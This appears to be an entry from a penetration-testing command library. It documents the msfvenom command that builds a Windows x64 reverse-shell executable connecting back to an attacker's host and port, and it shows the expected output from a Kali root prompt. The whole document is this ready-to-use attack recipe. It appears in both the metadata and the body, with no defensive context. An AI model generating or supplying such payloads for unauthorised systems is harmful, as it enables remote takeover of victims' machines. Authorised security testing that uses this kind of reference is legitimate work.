---
id: 5b8bf5cc-02cc-4c39-976d-c356d02a7565
name: msfvenom Generate a Generic Windows x64 Reverse Shell
type: command
executor: bash
data: msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT
  -f exe -o $_PROGRAM.exe
output: 'root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100
  LPORT=443 -f exe -o program.exe

  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

  [-] No arch selected, selecting arch: x64 from the payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 460 bytes

  Final size of exe file: 7168 bytes

  Saved as: program.exe'
created_at: '2020-03-30T21:59:32.816939+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[msfvenom]]'
---

# msfvenom Generate a Generic Windows x64 Reverse Shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o $_PROGRAM.exe
```

## Expected Output

```
root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: program.exe
```


